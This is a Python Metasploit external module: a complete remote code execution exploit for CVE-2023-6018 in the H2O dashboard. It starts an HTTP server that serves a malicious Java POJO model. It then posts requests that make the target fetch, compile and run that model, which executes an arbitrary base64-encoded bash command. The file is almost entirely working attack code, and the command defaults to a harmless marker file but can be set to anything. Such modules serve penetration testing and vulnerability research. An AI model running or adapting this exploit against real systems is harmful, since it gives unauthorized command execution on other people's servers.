#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

# standard modules
import logging
import threading
import base64
import socket
import uuid
import time
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

from metasploit import module

# extra modules
dependencies_missing = False
try:
    import requests
    from requests import Session
except ImportError:
    dependencies_missing = True


metadata = {
    'name': 'H2O POJO model import RCE',
    'description': '''
        RCE in H2O dashboard by (ab)using it's POJO Model import feature
    ''',
    'authors': [
        'sierrabearchell'
        'byt3bl33d3r <marcello@protectai.com>',
    ],

    'rank': 'excellent',
    'date': '2023-11-15',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://huntr.com/bounties/83dd17ec-053e-453c-befb-7d6736bf1836/'},
        {'type': 'cve', 'ref': 'CVE-2023-6018'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'targets': [
        {'platform': 'linux', 'arch': 'x64'},
        {'platform': 'linux', 'arch': 'x86'}
    ],
    'payload': {
        'command_stager_flavor': 'wget'
    },
    'options': {
        'command': {'type': 'string', 'description': 'The command to execute', 'required': True, 'default': 'touch /tmp/HACKED'},
        'serverport': {'type': 'port', 'description': 'HTTP server port to bind to', 'required': True, 'default': 8081},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port (TCP)', 'required': True, 'default': 54321},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False}
    }
}

POJO_PAYLOAD = '''
public class gbm_pojo {{
    public gbm_pojo() {{
        try {{
            String command = "bash -c {{echo,{}}}|{{base64,-d}}|{{bash,-i}}" ;
            Process proc = Runtime.getRuntime().exec(command);
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
}}
'''

class H2OExploitHandler(SimpleHTTPRequestHandler):
    MSF_ARGS = None
    RETRIEVED = False

    @property
    def url(self):
        return urlparse(self.path)

    def do_GET(self) -> None:
        self.send_response(200)
        #self.send_header("Content-Type", "application/json")
        self.end_headers()

        if self.url.path == "/gbm_pojo.java":
            logging.info("H2O asked for POJO file!")

            b64_command = base64.b64encode(H2OExploitHandler.MSF_ARGS['command'].encode())
            bad_pojo = POJO_PAYLOAD.format(b64_command.decode())
            logging.debug(bad_pojo)

            self.wfile.write(bad_pojo.encode())
            H2OExploitHandler.RETRIEVED = True

def convert_args_to_correct_type(args):
    '''
    Utility function to correctly "cast" the modules options to their correct types according to the options.

    When a module is run using msfconsole, the module args are all passed as strings
    so we need to convert them manually. I'd use pydantic but want to avoid extra deps.
    '''

    corrected_args = {}

    for k,v in args.items():
        option_to_convert = metadata['options'].get(k)
        if option_to_convert:
            type_to_convert = metadata['options'][k]['type']
            if type_to_convert == 'bool':
                if isinstance(v, str):
                    if v.lower() == 'false':
                        corrected_args[k] = False
                    elif v.lower() == 'true':
                        corrected_args[k] = True

            if type_to_convert == 'port':
                corrected_args[k] = int(v)

    return {**args, **corrected_args}

def trigger_rce(session, base_url, callback_url):
    model_id = f"generic-{uuid.uuid4()}"

    logging.info(f"Attempting to register model '{model_id}'...")
    session.post(f"{base_url}/3/ModelBuilders/generic/parameters", data = {'model_id': model_id})

    #logging.info('Asking H2O-3 to retrieve the model from our webserver...')
    #session.post(f"{base_url}/3/ModelBuilders/generic/parameters", data = {'model_id': model_id, 'path': callback_url})

    #logging.info('Asking H2O-3 to retrieve the model from our webserver (2/2)...')
    #session.post(f"{base_url}/3/ModelBuilders/generic/parameters", data = {'model_id': model_id, 'path': callback_url})

    logging.info('Triggering the retrieval, compilation & execution of the malicious model')
    r = session.post(f"{base_url}/3/ModelBuilders/generic", data = {'model_id': model_id, 'path': callback_url})
    return r

def run(args):
    args = convert_args_to_correct_type(args)

    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")

    logging.debug(args)

    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    server_ip = socket.gethostbyname(socket.gethostname())
    server_port = args['serverport']

    H2OExploitHandler.MSF_ARGS = args
    server = HTTPServer(
        (server_ip, server_port),
        H2OExploitHandler
    )

    logging.info(f"Starting HTTP Server on {server_ip}:{server_port}")
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    try:
        base_url = f"{'https' if args['ssl'] else 'http'}://{args['rhost']}:{args['rport']}"
        s = Session()
        s.hooks = {
            'response': lambda r, *args, **kwargs: r.raise_for_status()
        }

        r = trigger_rce(s, base_url, f"http://{server_ip}:{server_port}/gbm_pojo.java")

    except requests.exceptions.HTTPError as e:
        logging.debug(f"{r.status_code} - body length: {len(r.text)}")
        logging.error(str(e))
        return

    wait_loops = 0
    while wait_loops < 5:
        if H2OExploitHandler.RETRIEVED:
            break
        
        logging.info(f"Waiting on POJO retrieval ({wait_loops}/5)")
        time.sleep(0.5)
        wait_loops += 1

    job_data = r.json()
    logging.info(f"Exploit succeeded (Job ID: {job_data['job']['key']['name']})")
    #logging.info(job_data)

if __name__ == '__main__':
    module.run(metadata, run)
